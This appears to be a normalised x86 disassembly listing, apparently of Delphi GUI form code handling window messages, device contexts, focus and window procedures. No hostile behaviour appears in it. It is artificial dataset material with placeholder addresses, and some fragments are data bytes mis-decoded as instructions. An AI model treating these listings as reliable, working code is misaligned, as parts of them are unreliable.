push ebp
push sub_4567e4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031e8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4567eb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_4567ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413ba4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031f0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
sub_45682c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40349c
and [ ebx + 0x2f4 ] 0xdf
sub_456864
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_455e70
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43d568
xor edx edx
mov eax ebx
call sub_43d58c
mov edx 0x140
mov eax ebx
call sub_43d5b4
mov edx 0xf0
mov eax ebx
call sub_43d5d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_423990
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_457180
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43c9d4
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031e8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4574e4
xor edx edx
mov eax ebx
call sub_43dfbc
xor edx edx
mov eax ebx
call sub_43df24
mov dl 0x1
mov eax ebx
call sub_444738
mov edx ebx
mov eax [ rw-data ]
call sub_45bb48
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4569dd
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41a384
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413f80
xor edx edx
mov eax ebx
call sub_416e00
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45a9f0
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_456a48
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40362c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_456b12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45936c
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45bb80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4032a0
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d01c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_455ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b19
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_456b2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_456b6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4574e4
sub_456b72
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40349c
test al al
jne r-xdata
call sub_403aa8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4574e4
sub_456ba8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_456be9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_456c08
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43fecc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_458eb0
sub_456c44
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d2c8
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413c88
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4582a8
mov edx esi
mov eax ebp
call sub_413f80
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_458280
mov edx esi
mov eax edi
call sub_4582a8
jmp r-xdata
xor edx edx
mov eax edi
call sub_45825c
sub_456d50
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440e90
xor edx edx
push ebp
push sub_456fa6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4405ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43d814
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43d858
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4570d8
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43efc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fad
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4563b0
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4440bc
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4563b0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4440bc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41d5e0
push eax
call sub_4061f4
mov edx eax
mov eax esi
call sub_41d5e8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_456fb5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441938
push 0x0
push 0x0
push ebx
push sub_4570bc
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_457088
push ebx
push sub_4570a0
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_457067
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4174f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43df24
sub_4570f3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4563b0
mov ecx edi
mov edx esi
mov eax ebx
call sub_4440bc
mov eax ebx
call sub_4571dc
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41d684
push eax
call sub_4061f4
mov edx eax
mov eax ebp
call sub_41d6a0
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d840
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43d7fc
push eax
call sub_4061f4
mov edx eax
mov eax ebx
call sub_457484
push edi
push esi
push ebp
call sub_4061f4
mov edx eax
mov eax ebx
call sub_4574b4
sub_457180
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4594e0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_457214
push ebx
mov ebx eax
mov eax ebx
call sub_458130
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4572a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4446c0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_457330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_444b9c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a708
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a6dc
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40349c
test al al
jne r-xdata
sub_45739c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031e8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4573c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebp
call sub_441328
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a708
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_444be4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a6dc
mov si 0xfff1
call sub_40349c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a718
jmp r-xdata
sub_45745c
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43dfe0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43efc4
sub_457484
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43d814
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4574b4
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43d858
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4574e4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43dd18
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45861c
pop esi
pop ebx
retn
sub_457528
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_457581
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457588
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_457590
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43dccc
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_441b50
mov eax ebx
call sub_441cec
sub_4575c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a554
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_457608
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44200c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40349c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40349c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43efc4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_451568
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457f34
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457881
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457864
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41e564
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e3e0
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_452a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45786b
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e564
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_451568
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457f34
call sub_4445f8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4579af
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457988
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45796b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e564
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e3e0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457972
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e564
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4445f8
mov esi eax
sub_45798f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ReleaseDC
retn
sub_457a40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_457a8c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
